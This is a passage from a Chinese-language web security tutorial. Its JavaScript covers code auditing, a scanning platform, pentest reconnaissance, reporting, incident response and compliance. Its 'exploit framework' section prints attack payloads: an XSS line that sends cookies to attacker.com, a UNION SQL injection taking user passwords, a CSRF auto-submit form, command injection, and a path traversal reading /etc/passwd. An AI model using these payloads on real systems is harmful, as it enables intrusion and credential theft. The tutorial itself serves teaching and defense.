    } catch (error) {
      console.error(`审计文件失败 ${filePath}: ${error.message}`);
    }
  }

  // 审计目录
  auditDirectory(dirPath, extensions = ['.js', '.ts', '.jsx', '.tsx']) {
    const files = this.getFiles(dirPath, extensions);

    for (const file of files) {
      this.auditFile(file);
    }

    return this.issues;
  }

  // 获取所有文件
  getFiles(dirPath, extensions) {
    const files = [];

    const entries = fs.readdirSync(dirPath, { withFileTypes: true });

    for (const entry of entries) {
      const fullPath = path.join(dirPath, entry.name);

      if (entry.isDirectory()) {
        // 跳过node_modules和.git
        if (!['node_modules', '.git', 'dist', 'build'].includes(entry.name)) {
          files.push(...this.getFiles(fullPath, extensions));
        }
      } else if (extensions.some(ext => entry.name.endsWith(ext))) {
        files.push(fullPath);
      }
    }

    return files;
  }

  // 生成审计报告
  generateReport() {
    const report = {
      generatedAt: new Date().toISOString(),
      totalIssues: this.issues.length,
      bySeverity: {
        CRITICAL: this.issues.filter(i => i.severity === 'CRITICAL').length,
        HIGH: this.issues.filter(i => i.severity === 'HIGH').length,
        MEDIUM: this.issues.filter(i => i.severity === 'MEDIUM').length,
        LOW: this.issues.filter(i => i.severity === 'LOW').length
      },
      byRule: {},
      issues: this.issues
    };

    // 按规则分组
    for (const issue of this.issues) {
      if (!report.byRule[issue.rule]) {
        report.byRule[issue.rule] = {
          name: issue.ruleName,
          count: 0
        };
      }
      report.byRule[issue.rule].count++;
    }

    return report;
  }
}

// 使用示例
const auditor = new CodeAuditor();
auditor.auditDirectory('./src');
const report = auditor.generateReport();

console.log('安全审计报告:');
console.log(JSON.stringify(report, null, 2));
```

### 10.4 安全工具实战：自动化安全检测平台

```javascript
// securityPlatform.js - 自动化安全检测平台
const VulnerabilityScanner = require('./vulnerabilityScanner');
const DependencyAuditor = require('./dependencyAuditor');
const CodeAuditor = require('./codeAuditor');

class SecurityPlatform {
  constructor() {
    this.scanner = new VulnerabilityScanner();
    this.auditor = new DependencyAuditor();
    this.codeAuditor = new CodeAuditor();
  }

  // 执行完整的安全扫描
  async runFullScan(options = {}) {
    const {
      targetUrl,
      codePath = './src',
      includeDependencyCheck = true,
      includeCodeAudit = true
    } = options;

    const results = {
      timestamp: new Date().toISOString(),
      targetUrl,
      codePath,
      scans: []
    };

    // 1. 漏洞扫描
    if (targetUrl) {
      console.log('执行漏洞扫描...');
      const vulnResults = await this.scanner.runAllScans(targetUrl);
      results.scans.push({
        type: 'VULNERABILITY_SCAN',
        results: vulnResults
      });
    }

    // 2. 依赖审计
    if (includeDependencyCheck) {
      console.log('执行依赖审计...');
      const depResults = await this.auditor.generateDependencyReport();
      results.scans.push({
        type: 'DEPENDENCY_AUDIT',
        results: depResults
      });
    }

    // 3. 代码审计
    if (includeCodeAudit) {
      console.log('执行代码审计...');
      this.codeAuditor.auditDirectory(codePath);
      const codeResults = this.codeAuditor.generateReport();
      results.scans.push({
        type: 'CODE_AUDIT',
        results: codeResults
      });
    }

    // 4. 生成综合评分
    results.securityScore = this.calculateSecurityScore(results);

    // 5. 生成修复建议
    results.recommendations = this.generateRecommendations(results);

    return results;
  }

  // 计算安全评分
  calculateSecurityScore(results) {
    let score = 100;

    for (const scan of results.scans) {
      if (scan.type === 'VULNERABILITY_SCAN') {
        const { summary } = scan.results;
        score -= summary.critical * 20;
        score -= summary.high * 10;
        score -= summary.medium * 5;
        score -= summary.low * 1;
      }

      if (scan.type === 'DEPENDENCY_AUDIT') {
        const vulns = scan.results?.audit?.metadata?.vulnerabilities || {};
        score -= (vulns.critical || 0) * 15;
        score -= (vulns.high || 0) * 8;
        score -= (vulns.medium || 0) * 3;
      }

      if (scan.type === 'CODE_AUDIT') {
        const { bySeverity } = scan.results;
        score -= bySeverity.CRITICAL * 25;
        score -= bySeverity.HIGH * 12;
        score -= bySeverity.MEDIUM * 5;
        score -= bySeverity.LOW * 1;
      }
    }

    return Math.max(0, Math.min(100, Math.round(score)));
  }

  // 生成修复建议
  generateRecommendations(results) {
    const recommendations = [];

    for (const scan of results.scans) {
      if (scan.type === 'CODE_AUDIT') {
        for (const issue of scan.results.issues) {
          if (issue.severity === 'CRITICAL' || issue.severity === 'HIGH') {
            recommendations.push({
              priority: issue.severity,
              type: 'CODE_FIX',
              file: issue.file,
              line: issue.line,
              issue: issue.ruleName,
              suggestion: this.getFixSuggestion(issue.rule)
            });
          }
        }
      }
    }

    return recommendations;
  }

  // 获取修复建议
  getFixSuggestion(ruleId) {
    const suggestions = {
      'SEC001': '使用JSON.parse()代替eval()，或重构代码避免动态执行',
      'SEC002': '使用textContent代替innerHTML，或使用DOMPurify净化输入',
      'SEC003': '使用参数化查询代替SQL拼接',
      'SEC004': '使用环境变量或密钥管理服务存储敏感信息',
      'SEC005': '使用crypto.randomBytes()或crypto.randomUUID()生成安全随机数'
    };

    return suggestions[ruleId] || '请查阅相关安全最佳实践进行修复';
  }
}

module.exports = SecurityPlatform;
```

---

## 十一、渗透测试：攻防对抗

### 11.1 渗透测试概述

渗透测试（Penetration Testing）是一种模拟真实攻击的安全测试方法，通过主动尝试利用系统漏洞来评估系统的安全性。渗透测试的目标是发现潜在的安全弱点，并提供修复建议。

**渗透测试类型：**

1. **黑盒测试**：测试人员不了解系统内部结构，仅从外部进行测试
2. **白盒测试**：测试人员拥有完整的系统文档和代码访问权限
3. **灰盒测试**：介于黑盒和白盒之间，测试人员拥有部分信息

**渗透测试标准流程：**

```
信息收集 → 威胁建模 → 漏洞分析 → 渗透攻击 → 后渗透 → 报告编写
```

### 11.2 信息收集阶段

```javascript
// informationGathering.js - 信息收集工具
const dns = require('dns');
const https = require('https');
const http = require('http');

class InformationGatherer {
  constructor(target) {
    this.target = target;
    this.results = {};
  }

  // DNS信息收集
  async gatherDNSInfo() {
    const dnsInfo = {
      A: [],
      AAAA: [],
      MX: [],
      NS: [],
      TXT: [],
      CNAME: []
    };

    // DNS A记录（IPv4）
    await this.resolveDNS('A', this.target, dnsInfo.A);

    // DNS AAAA记录（IPv6）
    await this.resolveDNS('AAAA', this.target, dnsInfo.AAAA);

    // DNS MX记录（邮件服务器）
    await this.resolveDNS('MX', this.target, dnsInfo.MX);

    // DNS NS记录（域名服务器）
    await this.resolveDNS('NS', this.target, dnsInfo.NS);

    // DNS TXT记录
    await this.resolveDNS('TXT', this.target, dnsInfo.TXT);

    this.results.dns = dnsInfo;
    return dnsInfo;
  }

  resolveDNS(recordType, domain, targetArray) {
    return new Promise((resolve) => {
      dns.resolve(domain, recordType, (err, records) => {
        if (!err && records) {
          targetArray.push(...(Array.isArray(records) ? records : [records]));
        }
        resolve();
      });
    });
  }

  // 收集HTTP响应头
  async gatherHTTPHeaders() {
    return new Promise((resolve) => {
      const protocol = this.target.startsWith('https') ? https : http;

      const url = new URL(this.target);
      const options = {
        hostname: url.hostname,
        port: url.port,
        path: '/',
        method: 'GET',
        rejectUnauthorized: false
      };

      const req = protocol.request(options, (res) => {
        this.results.headers = {
          statusCode: res.statusCode,
          headers: res.headers,
          server: res.headers['server'],
          xPoweredBy: res.headers['x-powered-by'],
          strictTransportSecurity: res.headers['strict-transport-security'],
          contentSecurityPolicy: res.headers['content-security-policy'],
          xFrameOptions: res.headers['x-frame-options']
        };
        resolve();
      });

      req.on('error', () => resolve());
      req.setTimeout(5000, () => {
        req.destroy();
        resolve();
      });

      req.end();
    });
  }

  // 收集子域名
  async gatherSubdomains(wordlist = []) {
    const subdomains = new Set();

    // 使用常见子域名前缀进行猜测
    const commonPrefixes = [
      'www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'test',
      'staging', 'api', 'cdn', 'static', 'assets', 'images',
      'mail', 'smtp', 'pop', 'imap', 'dns', 'mysql',
      'mongodb', 'redis', 'elasticsearch', 'kibana',
      'grafana', 'prometheus', 'jenkins', 'gitlab'
    ];

    for (const prefix of commonPrefixes) {
      const subdomain = `${prefix}.${this.target}`;

      try {
        await this.resolveDNS('A', subdomain, []);
        subdomains.add(subdomain);
      } catch {
        // 解析失败，忽略
      }
    }

    // 使用自定义词表
    for (const prefix of wordlist) {
      const subdomain = `${prefix}.${this.target}`;

      try {
        await this.resolveDNS('A', subdomain, []);
        subdomains.add(subdomain);
      } catch {
        // 忽略
      }
    }

    this.results.subdomains = Array.from(subdomains);
    return this.results.subdomains;
  }

  // 技术指纹识别
  async fingerprint() {
    await this.gatherHTTPHeaders();

    const fingerprint = {
      server: this.results.headers?.server,
      poweredBy: this.results.headers?.xPoweredBy,
      securityHeaders: {},
      technologies: []
    };

    // 分析安全头
    const securityHeaders = [
      'strict-transport-security',
      'content-security-policy',
      'x-frame-options',
      'x-content-type-options',
      'x-xss-protection'
    ];

    for (const header of securityHeaders) {
      fingerprint.securityHeaders[header] = !!this.results.headers?.headers?.[header];
    }

    // 基于响应头推断技术栈
    if (this.results.headers?.server) {
      const server = this.results.headers.server;
      if (server.includes('Apache')) fingerprint.technologies.push('Apache');
      if (server.includes('nginx')) fingerprint.technologies.push('nginx');
      if (server.includes('Microsoft')) fingerprint.technologies.push('IIS');
    }

    if (this.results.headers?.xPoweredBy) {
      const poweredBy = this.results.headers.xPoweredBy;
      if (poweredBy.includes('ASP.NET')) fingerprint.technologies.push('ASP.NET');
      if (poweredBy.includes('PHP')) fingerprint.technologies.push('PHP');
      if (poweredBy.includes('Express')) fingerprint.technologies.push('Node.js/Express');
    }

    this.results.fingerprint = fingerprint;
    return fingerprint;
  }

  // 执行完整信息收集
  async gatherAll() {
    console.log(`开始收集 ${this.target} 的信息...`);

    await Promise.all([
      this.gatherDNSInfo(),
      this.gatherHTTPHeaders()
    ]);

    await this.fingerprint();

    return this.results;
  }
}
```

### 11.3 漏洞利用

```javascript
// exploitFramework.js - 漏洞利用框架
class ExploitFramework {
  constructor() {
    this.exploits = new Map();
    this.registerDefaultExploits();
  }

  registerDefaultExploits() {
    // XSS漏洞利用
    this.register('xss', {
      name: '存储型XSS Cookie窃取',
      severity: 'HIGH',
      execute: async (target, context) => {
        return {
          payload: `<script>new Image().src='https://attacker.com/steal?c='+document.cookie;</script>`,
          description: '注入窃取Cookie的恶意脚本',
          expectedResult: '用户访问时Cookie被发送到攻击者服务器'
        };
      }
    });

    // SQL注入漏洞利用
    this.register('sql_injection', {
      name: 'SQL注入数据提取',
      severity: 'CRITICAL',
      execute: async (target, context) => {
        return {
          payload: "' UNION SELECT NULL,username,password,NULL,NULL FROM users--",
          description: '使用UNION注入提取用户表数据',
          expectedResult: '获取系统用户账号密码'
        };
      }
    });

    // CSRF漏洞利用
    this.register('csrf', {
      name: 'CSRF状态变更攻击',
      severity: 'MEDIUM',
      execute: async (target, context) => {
        return {
          payload: `
            <form action="${target}" method="POST" id="exploit">
              <input type="hidden" name="action" value="delete">
              <input type="hidden" name="id" value="1">
            </form>
            <script>document.getElementById('exploit').submit();</script>
          `,
          description: '构造自动提交的表单进行CSRF攻击',
          expectedResult: '以受害者身份执行删除操作'
        };
      }
    });

    // 命令注入漏洞利用
    this.register('command_injection', {
      name: 'OS命令注入',
      severity: 'CRITICAL',
      execute: async (target, context) => {
        return {
          payload: '; cat /etc/passwd',
          description: '在参数中注入系统命令',
          expectedResult: '读取服务器系统文件'
        };
      }
    });

    // 路径遍历漏洞利用
    this.register('path_traversal', {
      name: '目录遍历攻击',
      severity: 'HIGH',
      execute: async (target, context) => {
        return {
          payload: '../../../etc/passwd',
          description: '使用路径遍历访问系统文件',
          expectedResult: '读取服务器系统文件'
        };
      }
    });
  }

  register(name, exploit) {
    this.exploits.set(name, exploit);
  }

  async execute(exploitName, target, context = {}) {
    const exploit = this.exploits.get(exploitName);

    if (!exploit) {
      throw new Error(`未知的漏洞利用: ${exploitName}`);
    }

    console.log(`执行漏洞利用: ${exploit.name}`);
    console.log(`目标: ${target}`);

    const result = await exploit.execute(target, context);

    return {
      exploitName,
      exploit: exploit.name,
      severity: exploit.severity,
      timestamp: new Date().toISOString(),
      ...result
    };
  }

  listExploits() {
    return Array.from(this.exploits.entries()).map(([name, exploit]) => ({
      name,
      displayName: exploit.name,
      severity: exploit.severity
    }));
  }
}
```

### 11.4 渗透测试报告模板

```javascript
// penetrationTestReport.js - 渗透测试报告生成器
class PenetrationTestReport {
  constructor() {
    this.findings = [];
    this.metadata = {};
  }

  setMetadata(info) {
    this.metadata = {
      projectName: info.projectName,
      testScope: info.testScope,
      startDate: info.startDate,
      endDate: info.endDate,
      tester: info.tester,
      client: info.client
    };
  }

  addFinding(finding) {
    this.findings.push({
      id: this.findings.length + 1,
      ...finding,
      discoveredAt: new Date().toISOString()
    });
  }

  generateReport() {
    const report = {
      ...this.metadata,
      summary: this.generateSummary(),
      riskRating: this.calculateRiskRating(),
      findings: this.findings,
      methodology: this.getMethodology(),
      recommendations: this.generateRecommendations()
    };

    return report;
  }

  generateSummary() {
    const total = this.findings.length;

    return {
      totalFindings: total,
      critical: this.findings.filter(f => f.severity === 'CRITICAL').length,
      high: this.findings.filter(f => f.severity === 'HIGH').length,
      medium: this.findings.filter(f => f.severity === 'MEDIUM').length,
      low: this.findings.filter(f => f.severity === 'LOW').length,
      info: this.findings.filter(f => f.severity === 'INFO').length
    };
  }

  calculateRiskRating() {
    const { critical, high, medium, low } = this.generateSummary();

    if (critical > 0) return 'CRITICAL';
    if (high > 0) return 'HIGH';
    if (medium > 0) return 'MEDIUM';
    if (low > 0) return 'LOW';
    return 'ACCEPTABLE';
  }

  getMethodology() {
    return [
      {
        phase: '信息收集',
        description: '收集目标系统的公开信息和网络拓扑',
        duration: '2小时',
        tools: ['DNS查询', '子域名枚举', '指纹识别']
      },
      {
        phase: '威胁建模',
        description: '分析收集的信息，识别潜在攻击向量',
        duration: '1小时',
        tools: ['手工分析', '架构审查']
      },
      {
        phase: '漏洞分析',
        description: '对识别出的攻击向量进行验证',
        duration: '4小时',
        tools: ['手动测试', '自动化扫描器']
      },
      {
        phase: '渗透攻击',
        description: '验证并利用发现的漏洞',
        duration: '6小时',
        tools: ['定制漏洞利用代码']
      },
      {
        phase: '报告编写',
        description: '整理测试结果，提供修复建议',
        duration: '2小时',
        tools: ['报告模板']
      }
    ];
  }

  generateRecommendations() {
    const recommendations = [];
    const severityOrder = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'];

    const sortedFindings = [...this.findings].sort((a, b) => {
      return severityOrder.indexOf(a.severity) - severityOrder.indexOf(b.severity);
    });

    for (const finding of sortedFindings) {
      recommendations.push({
        priority: finding.severity,
        vulnerability: finding.title,
        impact: finding.description,
        remediation: finding.remediation
      });
    }

    return recommendations;
  }

  exportAsJSON() {
    return JSON.stringify(this.generateReport(), null, 2);
  }

  exportAsMarkdown() {
    const report = this.generateReport();
    let md = `# 渗透测试报告\n\n`;

    md += `## 基本信息\n\n`;
    md += `- 项目名称: ${report.projectName}\n`;
    md += `- 测试范围: ${report.testScope}\n`;
    md += `- 测试日期: ${report.startDate} 至 ${report.endDate}\n`;
    md += `- 测试人员: ${report.tester}\n\n`;

    md += `## 执行摘要\n\n`;
    md += `- 风险等级: **${report.riskRating}**\n`;
    md += `- 发现问题总数: ${report.summary.totalFindings}\n`;
    md += `- 严重: ${report.summary.critical} | 高危: ${report.summary.high} | 中危: ${report.summary.medium} | 低危: ${report.summary.low}\n\n`;

    md += `## 发现的问题\n\n`;

    for (const finding of report.findings) {
      md += `### ${finding.id}. ${finding.title} [${finding.severity}]\n\n`;
      md += `**描述:** ${finding.description}\n\n`;
      md += `**影响:** ${finding.impact}\n\n`;
      md += `**修复建议:** ${finding.remediation}\n\n`;
      if (finding.poc) {
        md += `**验证方法:** \`${finding.poc}\`\n\n`;
      }
      md += `---\n\n`;
    }

    return md;
  }
}
```

### 11.5 我的思考：攻防对抗的本质

在长期的安全工作实践中，我深刻认识到攻防对抗本质上是一场永无止境的博弈。

**攻击者的优势：**

攻击者只需要找到一个漏洞点就能突破防线，而防御者需要防护所有可能的攻击面。这种不对称性使得安全防护面临巨大挑战。

**防御者的优势：**

虽然攻击者具有主动性，但防御者拥有更多的信息优势。防御者了解系统的内部结构和安全机制，可以设计深层次的防护体系。

**永恒的主题：**

1. **安全的相对性**：没有绝对安全的系统，只有在特定威胁模型下相对安全的设计。安全的目标是提高攻击成本，而不是追求完美。

2. **纵深防御**：单一的安全措施容易被绕过，需要建立多层次的安全防护体系。每层防线即使被突破，也能为检测和响应争取时间。

3. **安全是生命线**：对于涉及用户隐私和财产安全的关键系统，安全不是可选项，而是生命线。一旦发生重大安全事件，不仅会导致直接的经济损失，还会严重损害用户信任。

4. **持续监控与改进**：安全不是一次性的项目，而是持续的过程。需要建立持续的安全监控机制，及时发现和修复新出现的漏洞。

5. **人是最薄弱的环节**：技术防护再完善，也可能因为人的疏忽或社会工程学攻击而失效。因此，安全培训和安全意识提升与技术创新同等重要。

---

## 十二、安全运营：持续安全保障

### 12.1 安全运营概述

安全运营（Security Operations）是组织为保护信息资产而持续进行的安全活动，包括安全监控、事件响应、漏洞管理、合规审计等多个方面。

**安全运营的核心目标：**

1. **预防**：通过各种措施防止安全事件发生
2. **检测**：及时发现正在发生或已经发生的安全事件
3. **响应**：快速有效地处置安全事件
4. **恢复**：将系统恢复到正常状态
5. **改进**：从安全事件中学习，持续改进安全能力

### 12.2 应急响应流程

```javascript
// incidentResponse.js - 安全事件应急响应系统
const EventEmitter = require('events');

class IncidentResponseSystem extends EventEmitter {
  constructor() {
    super();
    this.incidents = new Map();
    this.incidentCounter = 0;
  }

  // 创建新的安全事件
  createIncident(data) {
    this.incidentCounter++;

    const incident = {
      id: `INC-${Date.now()}-${this.incidentCounter}`,
      title: data.title,
      description: data.description,
      severity: data.severity, // CRITICAL, HIGH, MEDIUM, LOW
      status: 'NEW',
      category: data.category, // XSS, SQL_INJECTION, CSRF, etc.
      affectedSystems: data.affectedSystems || [],
      indicators: data.indicators || [],
      createdAt: new Date().toISOString(),
      assignedTo: null,
      timeline: [{
        timestamp: new Date().toISOString(),
        action: '事件创建',
        actor: 'system',
        details: '安全事件已创建，等待分配'
      }]
    };

    this.incidents.set(incident.id, incident);

    // 触发事件通知
    this.emit('incident:created', incident);

    // 如果是严重事件，触发紧急响应
    if (incident.severity === 'CRITICAL') {
      this.triggerEmergencyResponse(incident);
    }

    return incident;
  }

  // 分配事件
  assignIncident(incidentId, assignee) {
    const incident = this.incidents.get(incidentId);
    if (!incident) {
      throw new Error('事件不存在');
    }

    incident.assignedTo = assignee;
    incident.status = 'ASSIGNED';

    this.addTimelineEntry(incidentId, '事件分配', assignee, `分配给 ${assignee}`);

    this.emit('incident:assigned', incident);

    return incident;
  }

  // 添加时间线条目
  addTimelineEntry(incidentId, action, actor, details) {
    const incident = this.incidents.get(incidentId);
    if (!incident) return;

    incident.timeline.push({
      timestamp: new Date().toISOString(),
      action,
      actor,
      details
    });

    this.emit('incident:updated', incident);
  }

  // 更新事件状态
  updateStatus(incidentId, status, actor, notes = '') {
    const incident = this.incidents.get(incidentId);
    if (!incident) {
      throw new Error('事件不存在');
    }

    const oldStatus = incident.status;
    incident.status = status;

    this.addTimelineEntry(
      incidentId,
      '状态更新',
      actor,
      `状态从 ${oldStatus} 变更为 ${status}${notes ? ': ' + notes : ''}`
    );

    // 状态变更触发相应流程
    if (status === 'RESOLVED') {
      this.handleResolved(incident);
    } else if (status === 'CLOSED') {
      this.handleClosed(incident);
    }

    this.emit('incident:status_changed', incident);

    return incident;
  }

  // 紧急响应流程
  triggerEmergencyResponse(incident) {
    console.log(`🚨 紧急响应触发: ${incident.id}`);

    // 1. 立即通知安全团队
    this.notifySecurityTeam(incident);

    // 2. 隔离受影响系统
    this.isolateAffectedSystems(incident);

    // 3. 启动事件响应会议
    this.scheduleIncidentCall(incident);

    // 4. 开始证据保全
    this.preserveEvidence(incident);
  }

  // 通知安全团队
  notifySecurityTeam(incident) {
    const notification = {
      channel: 'pagerduty',
      severity: incident.severity,
      title: incident.title,
      incidentId: incident.id,
      timestamp: new Date().toISOString()
    };

    // 实际应用中调用告警系统
    console.log('发送告警通知:', notification);

    // 记录通知
    this.addTimelineEntry(
      incident.id,
      '团队通知',
      'system',
      '已通知安全团队'
    );
  }

  // 隔离受影响系统
  isolateAffectedSystems(incident) {
    for (const system of incident.affectedSystems) {
      console.log(`隔离系统: ${system}`);

      this.addTimelineEntry(
        incident.id,
        '系统隔离',
        'system',
        `隔离受影响系统: ${system}`
      );
    }
  }

  // 安排事件响应会议
  scheduleIncidentCall(incident) {
    const meeting = {
      topic: `安全事件响应: ${incident.title}`,
      duration: '30分钟',
      participants: ['安全团队', '开发团队', '运维团队'],
      agenda: [
        '确认事件范围和影响',
        '分析根本原因',
        '制定响应策略',
        '分配任务'
      ]
    };

    console.log('安排事件响应会议:', meeting);

    this.addTimelineEntry(
      incident.id,
      '会议安排',
      'system',
      '已安排事件响应会议'
    );
  }

  // 保全证据
  preserveEvidence(incident) {
    const evidence = {
      incidentId: incident.id,
      collectedAt: new Date().toISOString(),
      type: 'multi',
      data: {
        logs: '已收集系统日志',
        networkTraffic: '已保存网络流量',
        memoryDump: '已创建内存转储',
        diskImage: '已创建磁盘镜像'
      }
    };

    console.log('证据保全完成:', evidence);

    this.addTimelineEntry(
      incident.id,
      '证据保全',
      'system',
      '已完成证据收集和保全'
    );
  }

  // 处理已解决事件
  handleResolved(incident) {
    // 触发事后分析
    this.schedulePostMortem(incident);
  }

  // 安排事后分析
  schedulePostMortem(incident) {
    const postMortem = {
      incidentId: incident.id,
      scheduledFor: new Date(Date.now() + 86400000).toISOString(), // 24小时后
      participants: ['安全团队', '开发团队'],
      agenda: [
        '时间线回顾',
        '根本原因分析',
        '响应过程评估',
        '改进措施制定'
      ]
    };

    console.log('安排事后分析:', postMortem);
  }

  // 处理关闭事件
  handleClosed(incident) {
    this.emit('incident:closed', incident);
  }

  // 获取事件统计
  getStatistics() {
    const stats = {
      total: this.incidents.size,
      byStatus: {},
      bySeverity: {},
      byCategory: {}
    };

    for (const incident of this.incidents.values()) {
      stats.byStatus[incident.status] = (stats.byStatus[incident.status] || 0) + 1;
      stats.bySeverity[incident.severity] = (stats.bySeverity[incident.severity] || 0) + 1;
      stats.byCategory[incident.category] = (stats.byCategory[incident.category] || 0) + 1;
    }

    return stats;
  }
}

// 使用示例
const responseSystem = new IncidentResponseSystem();

// 监听事件
responseSystem.on('incident:created', (incident) => {
  console.log(`新事件创建: ${incident.id}`);
});

responseSystem.on('incident:assigned', (incident) => {
  console.log(`事件已分配: ${incident.id} -> ${incident.assignedTo}`);
});

// 创建安全事件
const incident = responseSystem.createIncident({
  title: '生产环境发现SQL注入漏洞',
  description: '用户搜索功能存在SQL注入漏洞',
  severity: 'CRITICAL',
  category: 'SQL_INJECTION',
  affectedSystems: ['web-server-01', 'web-server-02'],
  indicators: ["' OR '1'='1"]
});

console.log('创建的事件:', incident);
```

### 12.3 安全培训体系

```javascript
// securityTraining.js - 安全培训管理系统
class SecurityTrainingSystem {
  constructor() {
    this.courses = this.initializeCourses();
    this.enrollments = new Map();
    this.completions = new Map();
  }

  initializeCourses() {
    return [
      {
        id: 'SEC101',
        title: 'Web安全基础',
        description: '了解常见的Web安全威胁和基本防护措施',
        duration: '2小时',
        modules: [
          { name: 'XSS攻击原理', duration: '30分钟' },
          { name: 'CSRF攻击原理', duration: '30分钟' },
          { name: 'SQL注入基础', duration: '30分钟' },
          { name: '安全编码实践', duration: '30分钟' }
        ],
        required: true,
        targetAudience: '所有开发人员'
      },
      {
        id: 'SEC102',
        title: '安全编码实战',
        description: '通过实际案例学习安全编码技巧',
        duration: '4小时',
        modules: [
          { name: '输入验证', duration: '60分钟' },
          { name: '输出编码', duration: '60分钟' },
          { name: '认证与授权', duration: '60分钟' },
          { name: '加密基础', duration: '60分钟' }
        ],
        required: true,
        targetAudience: '后端开发人员'
      },
      {
        id: 'SEC103',
        title: '前端安全工程',
        description: '前端开发中的安全考虑和最佳实践',
        duration: '3小时',
        modules: [
          { name: '前端XSS防护', duration: '45分钟' },
          { name: 'CSP配置实践', duration: '45分钟' },
          { name: 'Cookie安全', duration: '45分钟' },
          { name: '第三方资源安全', duration: '45分钟' }
        ],
        required: true,
        targetAudience: '前端开发人员'
      },
      {
        id: 'SEC201',
        title: '渗透测试入门',
        description: '学习如何发现和利用Web应用漏洞',
        duration: '8小时',
        modules: [
          { name: '渗透测试方法论', duration: '60分钟' },
          { name: '信息收集技术', duration: '90分钟' },
          { name: '漏洞扫描工具', duration: '90分钟' },
          { name: '漏洞利用基础', duration: '120分钟' },
          { name: '报告编写', duration: '60分钟' }
        ],
        required: false,
        targetAudience: '安全工程师'
      },
      {
        id: 'SEC301',
        title: '安全架构设计',
        description: '设计安全系统的架构原则和模式',
        duration: '6小时',
        modules: [
          { name: '威胁建模', duration: '90分钟' },
          { name: '安全架构模式', duration: '90分钟' },
          { name: '零信任架构', duration: '90分钟' },
          { name: '合规性要求', duration: '90分钟' }
        ],
        required: false,
        targetAudience: '架构师'
      }
    ];
  }

  // 获取课程列表
  listCourses(filters = {}) {
    let courses = [...this.courses];

    if (filters.required !== undefined) {
      courses = courses.filter(c => c.required === filters.required);
    }

    if (filters.targetAudience) {
      courses = courses.filter(c =>
        c.targetAudience.includes(filters.targetAudience)
      );
    }

    return courses;
  }

  // 报名课程
  enroll(userId, courseId) {
    const course = this.courses.find(c => c.id === courseId);
    if (!course) {
      throw new Error('课程不存在');
    }

    const key = `${userId}:${courseId}`;
    this.enrollments.set(key, {
      userId,
      courseId,
      enrolledAt: new Date().toISOString(),
      status: 'ENROLLED'
    });

    return { success: true, course };
  }

  // 完成课程模块
  completeModule(userId, courseId, moduleName) {
    const key = `${userId}:${courseId}`;

    if (!this.completions.has(key)) {
      this.completions.set(key, new Set());
    }

    const completed = this.completions.get(key);
    completed.add(moduleName);

    const course = this.courses.find(c => c.id === courseId);
    const totalModules = course.modules.length;
    const completedCount = completed.size;
    const progress = Math.round((completedCount / totalModules) * 100);

    return {
      userId,
      courseId,
      completedModules: completedCount,
      totalModules,
      progress,
      isComplete: completedCount === totalModules
    };
  }

  // 获取用户学习进度
  getUserProgress(userId) {
    const progress = [];

    for (const course of this.courses) {
      const key = `${userId}:${course.id}`;
      const enrollment = this.enrollments.get(key);
      const completed = this.completions.get(key) || new Set();

      if (enrollment) {
        progress.push({
          courseId: course.id,
          courseName: course.title,
          status: completed.size === course.modules.length ? 'COMPLETED' : 'IN_PROGRESS',
          progress: Math.round((completed.size / course.modules.length) * 100),
          enrolledAt: enrollment.enrolledAt,
          completedAt: completed.size === course.modules.length ? new Date().toISOString() : null
        });
      }
    }

    return progress;
  }

  // 生成培训报告
  generateTrainingReport() {
    const report = {
      generatedAt: new Date().toISOString(),
      courses: this.courses.map(course => ({
        id: course.id,
        title: course.title,
        duration: course.duration,
        required: course.required,
        enrollmentCount: Array.from(this.enrollments.values())
          .filter(e => e.courseId === course.id).length
      })),
      summary: {
        totalCourses: this.courses.length,
        requiredCourses: this.courses.filter(c => c.required).length,
        totalEnrollments: this.enrollments.size
      }
    };

    return report;
  }
}
```

### 12.4 合规管理

```javascript
// complianceManager.js - 合规管理系统
class ComplianceManager {
  constructor() {
    this.frameworks = this.initializeFrameworks();
    this.controls = new Map();
    this.auditLogs = [];
  }

  initializeFrameworks() {
    return {
      GDPR: {
        name: '通用数据保护条例',
        region: '欧盟',
        keyRequirements: [
          '数据主体权利保护',
          '数据处理合法性',
          '数据泄露通知',
          '隐私设计原则'
        ]
      },
      'PIPL': {
        name: '个人信息保护法',
        region: '中国',
        keyRequirements: [
          '个人信息收集最小化',
          '明确同意原则',
          '数据本地化',
          '安全影响评估'
        ]
      },
      'ISO27001': {
        name: '信息安全管理体系',
        region: '国际',
        keyRequirements: [
          '风险评估与管理',
          '安全策略',
          '资产管玾',
          '访问控制',
          '安全事件管理'
        ]
      },
      SOC2: {
        name: '服务组织控制',
        region: '美国',
        keyRequirements: [
          '安全性',
          '可用性',
          '处理完整性',
          '保密性',
          '隐私'
        ]
      }
    };
  }

  // 定义安全控制项
  defineControl(control) {
    const controlItem = {
      id: control.id,
      framework: control.framework,
      category: control.category,
      title: control.title,
      description: control.description,
      implementation: control.implementation || null,
      evidence: control.evidence || null,
      status: control.status || 'NOT_IMPLEMENTED',
      lastReview: new Date().toISOString(),
      nextReview: this.calculateNextReview(control.frequency || 'ANNUALLY')
    };

    this.controls.set(control.id, controlItem);
    return controlItem;
  }

  calculateNextReview(frequency) {
    const intervals = {
      'QUARTERLY': 90,
      'SEMI_ANNUALLY': 180,
      'ANNUALLY': 365
    };

    const days = intervals[frequency] || 365;
    return new Date(Date.now() + days * 86400000).toISOString();
  }

  // 更新控制项状态
  updateControlStatus(controlId, status, evidence, implementation) {
    const control = this.controls.get(controlId);
    if (!control) {
      throw new Error('控制项不存在');
    }

    control.status = status;
    control.lastReview = new Date().toISOString();
    control.nextReview = this.calculateNextReview(
      control.frequency || 'ANNUALLY'
    );

    if (evidence) control.evidence = evidence;
    if (implementation) control.implementation = implementation;

    this.logAudit('CONTROL_UPDATE', control);

    return control;
  }

  // 审计日志
  logAudit(action, data) {
    this.auditLogs.push({
      timestamp: new Date().toISOString(),
      action,
      data,
      user: 'system'
    });
  }

  // 生成合规报告
  generateComplianceReport(framework) {
    const fw = this.frameworks[framework];
    if (!fw) {
      throw new Error('未知的合规框架');
    }

    const frameworkControls = Array.from(this.controls.values())
      .filter(c => c.framework === framework);

    const report = {
      framework: fw.name,
      generatedAt: new Date().toISOString(),
      summary: {
        totalControls: frameworkControls.length,
        implemented: frameworkControls.filter(c => c.status === 'IMPLEMENTED').length,
        inProgress: frameworkControls.filter(c => c.status === 'IN_PROGRESS').length,
        notImplemented: frameworkControls.filter(c => c.status === 'NOT_IMPLEMENTED').length,
        complianceRate: frameworkControls.length > 0
          ? Math.round(
